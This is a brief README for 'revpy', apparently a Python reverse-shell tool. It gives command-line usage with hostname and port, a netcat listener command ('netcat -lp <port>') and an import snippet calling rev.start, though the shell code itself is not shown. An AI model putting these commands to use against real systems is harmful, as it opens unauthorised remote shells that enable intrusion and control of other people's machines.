# revpy
Primative reverse shell written in Python.

# usage
python rev.py <hostname> <port>

# how to run a server
run "netcat -lp <port>"

# how to import and use in your own python code
import \<location of your rev.py file\>
  
...

rev.start(hostname, port)
